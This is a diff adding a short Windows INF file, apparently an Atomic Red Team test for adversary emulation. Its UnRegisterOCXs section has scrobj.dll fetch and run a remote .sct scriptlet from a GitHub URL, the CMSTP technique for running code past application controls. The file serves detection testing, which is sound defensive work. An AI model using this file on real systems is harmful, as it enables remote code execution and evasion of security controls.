@@ -1,0 +1,16 @@
+; Author: @NickTyrer - https://twitter.com/NickTyrer/status/958450014111633408
+
+[version]
+Signature=$chicago$
+AdvancedINF=2.5
+
+[DefaultInstall_SingleUser]
+UnRegisterOCXs=UnRegisterOCXSection
+
+[UnRegisterOCXSection]
+%11%\scrobj.dll,NI,https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/CMSTP.sct
+
+[Strings]
+AppAct = "SOFTWARE\Microsoft\Connection Manager"
+ServiceName="Yay"
+ShortSvcName="Yay"
